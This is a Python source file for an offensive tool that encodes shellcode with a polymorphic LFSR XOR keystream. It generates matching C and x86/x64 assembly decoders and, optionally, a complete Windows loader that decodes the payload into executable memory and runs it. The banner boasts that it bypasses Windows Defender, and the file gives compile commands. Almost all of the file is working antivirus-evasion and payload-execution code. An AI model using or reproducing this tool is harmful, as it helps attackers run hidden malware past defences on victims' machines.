#!/usr/bin/python3
import sys
import secrets
import argparse
import time

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    print("[-] colorama not installed. Run: pip install colorama")
    sys.exit(1)

class LFSR:
    def __init__(self, seed, taps):
        self.state = seed
        self.taps = taps
        self.size = max(taps)
    
    def shift(self):
        feedback = 0
        for tap in self.taps:
            feedback ^= (self.state >> (tap - 1)) & 1
        output = self.state & 1
        self.state = (self.state >> 1) | (feedback << (self.size - 1))
        return output
    
    def get_byte(self):
        byte = 0
        for i in range(8):
            byte |= (self.shift() << i)
        return byte

MAXIMAL_TAPS = {
    8:  [[8, 6, 5, 4], [8, 7, 6, 1], [8, 7, 6, 5, 2, 1]],
    16: [[16, 15, 13, 4], [16, 14, 13, 11], [16, 15, 14, 13]],
    32: [[32, 31, 29, 1], [32, 31, 30, 10], [32, 30, 26, 25]],
}


def lfsr_encode(shellcode, seed, taps):
    lfsr = LFSR(seed, taps)
    return bytes([b ^ lfsr.get_byte() for b in shellcode])


def find_safe_config(shellcode, bits=16, max_attempts=10000):
    for _ in range(max_attempts):
        seed = secrets.randbelow(2**bits - 1) + 1
        taps = secrets.choice(MAXIMAL_TAPS[bits])
        encoded = lfsr_encode(shellcode, seed, taps)
        if b'\x00' not in encoded:
            return seed, taps, encoded
    return None, None, None


def format_shellcode(data, label="encoded_sc"):
    lines = [f"unsigned char {label}[] = "]
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        hex_str = ''.join(f'\\x{b:02x}' for b in chunk)
        lines.append(f'    "{hex_str}"')
    return '\n'.join(lines) + ';'


def generate_looped_decoder(seed, taps, length):
    taps_arr = ', '.join(str(t) for t in taps)
    return f"""#define LFSR_SEED    0x{seed:04x}
#define LFSR_SIZE    {max(taps)}
#define NUM_TAPS     {len(taps)}
#define SC_LENGTH    {length}

void lfsr_decode(unsigned char *buf, int len) {{
    unsigned int state = LFSR_SEED;
    int taps[] = {{ {taps_arr} }};
    for (int i = 0; i < len; i++) {{
        unsigned char keystream_byte = 0;
        for (int bit = 0; bit < 8; bit++) {{
            int feedback = 0;
            for (int t = 0; t < NUM_TAPS; t++)
                feedback ^= (state >> (taps[t] - 1)) & 1;
            keystream_byte |= (state & 1) << bit;
            state = (state >> 1) | (feedback << (LFSR_SIZE - 1));
        }}
        buf[i] ^= keystream_byte;
    }}
}}
"""


def generate_noloop_decoder(shellcode, seed, taps, compact=False, per_line=8):
    lfsr = LFSR(seed, taps)
    
    lines = []
    lines.append(f"// Seed: 0x{seed:04x}, Taps: {taps}, Length: {len(shellcode)}")
    lines.append("void lfsr_decode(unsigned char *buf) {")
    
    if compact:
        for i in range(0, len(shellcode), per_line):
            chunk = []
            for j in range(i, min(i + per_line, len(shellcode))):
                key_byte = lfsr.get_byte()
                chunk.append(f"buf[{j}]^=0x{key_byte:02x};")
            lines.append("    " + " ".join(chunk))
    else:
        for i in range(len(shellcode)):
            key_byte = lfsr.get_byte()
            lines.append(f"    buf[{i}] ^= 0x{key_byte:02x};")
    
    lines.append("}")
    return '\n'.join(lines)


def generate_noloop_asm_x64(shellcode, seed, taps):
    lfsr = LFSR(seed, taps)
    
    lines = []
    lines.append(f"; Seed: 0x{seed:04x}, Taps: {taps}, Length: {len(shellcode)}")
    lines.append("section .text")
    lines.append("global decode")
    lines.append("decode:")
    
    for i in range(len(shellcode)):
        key_byte = lfsr.get_byte()
        lines.append(f"    xor byte [rdi+{i}], 0x{key_byte:02x}")
    
    lines.append("    ret")
    return '\n'.join(lines)


def generate_noloop_asm_x86(shellcode, seed, taps):
    lfsr = LFSR(seed, taps)
    
    lines = []
    lines.append(f"; Seed: 0x{seed:04x}, Taps: {taps}, Length: {len(shellcode)}")
    lines.append("section .text")
    lines.append("global _decode")
    lines.append("_decode:")
    lines.append("    mov esi, [esp+4]")
    
    for i in range(len(shellcode)):
        key_byte = lfsr.get_byte()
        lines.append(f"    xor byte [esi+{i}], 0x{key_byte:02x}")
    
    lines.append("    ret")
    return '\n'.join(lines)


def calculate_loader_size(shellcode_len, mode, compact):
    base_size = 350
    shellcode_formatted = shellcode_len * 4 + (shellcode_len // 16) * 10
    
    if mode == "looped":
        decoder_size = 450
    elif compact:
        lines = (shellcode_len + 7) // 8
        decoder_size = 80 + lines * 90
    else:
        decoder_size = 80 + shellcode_len * 25
    
    return base_size + shellcode_formatted + decoder_size


def generate_full_loader(shellcode, encoded, seed, taps, mode, compact=False, per_line=8, output_file=None):
    sc_formatted = format_shellcode(encoded)
    
    if mode == "looped":
        decoder = generate_looped_decoder(seed, taps, len(shellcode))
        decode_call = "lfsr_decode((unsigned char *)exec, SC_LENGTH);"
    else:
        decoder = generate_noloop_decoder(shellcode, seed, taps, compact, per_line)
        decode_call = "lfsr_decode((unsigned char *)exec);"

    print(f"\n{Fore.GREEN}{Style.BRIGHT}[+] SUCCESS!! Boss, your C loader awaits you...{Style.RESET_ALL}\n")

    info_lines = [
        f"// ╔══════════════════════════════════════════════════════════════╗",
        f"// ║           FUKAHI NA TEKIO - Polymorphic LFSR Encoder         ║",
        f"// ╠══════════════════════════════════════════════════════════════╣",
        f"//    Input shellcode:  {len(shellcode):>6} bytes",
        f"//    Encoded payload:  {len(encoded):>6} bytes",
        f"//    LFSR seed:        0x{seed:04x}",
        f"//    LFSR taps:        {str(taps):<36}",
        f"//    Mode:             {mode + (' (compact)' if compact else ''):<36}",
    ]
    
    if output_file:
        info_lines.append(f"//    Output file:      {output_file:<36}")
    
    info_lines.extend([
        f"// ╚══════════════════════════════════════════════════════════════╝",
        f"",
    ])
    
    info_header = '\n'.join(info_lines)
    
    return f"""{info_header}
#include <stdio.h>
#include <windows.h>

{decoder}

{sc_formatted}

int main() {{
    void *exec = VirtualAlloc(0, sizeof encoded_sc, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, encoded_sc, sizeof encoded_sc);
    {decode_call}
    ((void(*)())exec)();
    return 0;
}}

// [!] Compile with correct architecture:
//     x86: i686-w64-mingw32-gcc loader.c -o loader.exe
//     x64: x86_64-w64-mingw32-gcc loader.c -o loader.exe
"""


def print_banner():
    banner = f"""
{Fore.GREEN}
  █████▒█    ██  ██ ▄█▀▄▄▄       ██░ ██  ██▓    ███▄    █  ▄▄▄         ▄▄▄█████▓▓█████  ██ ▄█▀ ██▓ ▒█████  
▓██   ▒ ██  ▓██▒ ██▄█▒▒████▄    ▓██░ ██▒▓██▒    ██ ▀█   █ ▒████▄       ▓  ██▒ ▓▒▓█   ▀  ██▄█▒ ▓██▒▒██▒  ██▒
▒████ ░▓██  ▒██░▓███▄░▒██  ▀█▄  ▒██▀▀██░▒██▒   ▓██  ▀█ ██▒▒██  ▀█▄     ▒ ▓██░ ▒░▒███   ▓███▄░ ▒██▒▒██░  ██▒
░▓█▒  ░▓▓█  ░██░▓██ █▄░██▄▄▄▄██ ░▓█ ░██ ░██░   ▓██▒  ▐▌██▒░██▄▄▄▄██    ░ ▓██▓ ░ ▒▓█  ▄ ▓██ █▄ ░██░▒██   ██░
░▒█░   ▒▒█████▓ ▒██▒ █▄▓█   ▓██▒░▓█▒░██▓░██░   ▒██░   ▓██░ ▓█   ▓██▒     ▒██▒ ░ ░▒████▒▒██▒ █▄░██░░ ████▓▒░
 ▒ ░   ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒▒▒   ▓▒█░ ▒ ░░▒░▒░▓     ░ ▒░   ▒ ▒  ▒▒   ▓▒█░     ▒ ░░   ░░ ▒░ ░▒ ▒▒ ▓▒░▓  ░ ▒░▒░▒░ 
 ░     ░░▒░ ░ ░ ░ ░▒ ▒░ ▒   ▒▒ ░ ▒ ░▒░ ░ ▒ ░   ░ ░░   ░ ▒░  ▒   ▒▒ ░       ░     ░ ░  ░░ ░▒ ▒░ ▒ ░  ░ ▒ ▒░ 
 ░ ░    ░░░ ░ ░ ░ ░░ ░  ░   ▒    ░  ░░ ░ ▒ ░      ░   ░ ░   ░   ▒        ░         ░   ░ ░░ ░  ▒ ░░ ░ ░ ▒  
          ░     ░  ░        ░  ░ ░  ░  ░ ░              ░       ░  ░               ░  ░░  ░    ░      ░ ░  {Style.RESET_ALL}
{Fore.YELLOW}============[Author: Xyconix / 0xXyc][不可避な適応]============{Style.RESET_ALL}
{Fore.YELLOW}++++["Inevitable Adaptation"]++++{Style.RESET_ALL}
{Fore.MAGENTA}Proudly Engineered by Swiz Security LLC{Style.RESET_ALL}
{Fore.GREEN}++[v1.0]++{Style.RESET_ALL}

{Fore.CYAN}Polymorphic LFSR (XOR) Shellcode Encoder{Style.RESET_ALL}
{Fore.WHITE}By: Jacob Swinsinski, Security Researcher{Style.RESET_ALL}
{Fore.YELLOW}FUN FACT: Currently bypasses WinDef as of January 2026!{Style.RESET_ALL}
"""
    print(banner)
    time.sleep(3)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Polymorphic LFSR shellcode encoder",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 fukahi.py <hex> --mode looped
  python3 fukahi.py <hex> --mode noloop --compact
  python3 fukahi.py <hex> --mode noloop --compact --per-line 12
  python3 fukahi.py <hex> --full-loader --compact -o loader.c
        """
    )
    
    parser.add_argument("shellcode", nargs='?', help="Hex-encoded shellcode")
    parser.add_argument("--bits", type=int, default=16, choices=[8, 16, 32],
                        help="LFSR bit size (default: 16)")
    parser.add_argument("--mode", default="noloop",
                        choices=["looped", "noloop", "asm-x64", "asm-x86"],
                        help="Decoder mode (default: noloop)")
    parser.add_argument("--compact", action="store_true",
                        help="Compact noloop output (multiple ops per line)")
    parser.add_argument("--per-line", type=int, default=8,
                        help="Operations per line in compact mode (default: 8)")
    parser.add_argument("--full-loader", action="store_true",
                        help="Generate complete C loader")
    parser.add_argument("--output", "-o", help="Output file")
    
    args = parser.parse_args()
    
    print_banner()
    
    if not args.shellcode:
        parser.print_help()
        sys.exit(0)
    
    print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Generating polymorphic payload...")
    time.sleep(1)
    
    try:
        shellcode = bytes.fromhex(args.shellcode)
    except ValueError:
        print(f"{Fore.RED}[-] ERROR:{Style.RESET_ALL} Invalid hex string", file=sys.stderr)
        sys.exit(1)
    
    seed, taps, encoded = find_safe_config(shellcode, args.bits)
    
    if seed is None:
        print(f"{Fore.RED}[-] ERROR:{Style.RESET_ALL} No safe configuration found!", file=sys.stderr)
        sys.exit(1)
    
    loader_size = calculate_loader_size(len(shellcode), args.mode, args.compact)
    
    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Input shellcode size:  {Style.BRIGHT}{len(shellcode)}{Style.RESET_ALL} bytes")
    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Encoded payload size:  {Style.BRIGHT}{len(encoded)}{Style.RESET_ALL} bytes")
    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} LFSR bits:             {Style.BRIGHT}{args.bits}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} LFSR seed:             {Style.BRIGHT}0x{seed:0{args.bits//4}x}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} LFSR taps:             {Style.BRIGHT}{taps}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Mode:                  {Style.BRIGHT}{args.mode}{' (compact)' if args.compact else ''}{Style.RESET_ALL}")
    if args.full_loader:
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Est. loader size:      {Style.BRIGHT}~{loader_size}{Style.RESET_ALL} bytes")
    if args.output:
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Output file:           {Style.BRIGHT}{args.output}{Style.RESET_ALL}")
    print()
    
    output_lines = []
    
    if args.full_loader:
        output_lines.append(generate_full_loader(shellcode, encoded, seed, taps, args.mode, args.compact, args.per_line, args.output))
    else:
        if args.mode == "looped":
            output_lines.append(generate_looped_decoder(seed, taps, len(shellcode)))
        elif args.mode == "noloop":
            output_lines.append(generate_noloop_decoder(shellcode, seed, taps, args.compact, args.per_line))
        elif args.mode == "asm-x64":
            output_lines.append(generate_noloop_asm_x64(shellcode, seed, taps))
        elif args.mode == "asm-x86":
            output_lines.append(generate_noloop_asm_x86(shellcode, seed, taps))
        
        output_lines.append("")
        output_lines.append(format_shellcode(encoded))
    
    result = '\n'.join(output_lines)
    
    if args.output:
        with open(args.output, 'w') as f:
            f.write(result)
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Written to {Style.BRIGHT}{args.output}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} File size: {Style.BRIGHT}{len(result)}{Style.RESET_ALL} bytes")
    else:
        print(result)
    
    print(f"\n{Fore.YELLOW}[*]{Style.RESET_ALL} Run again for a different polymorphic variant.")
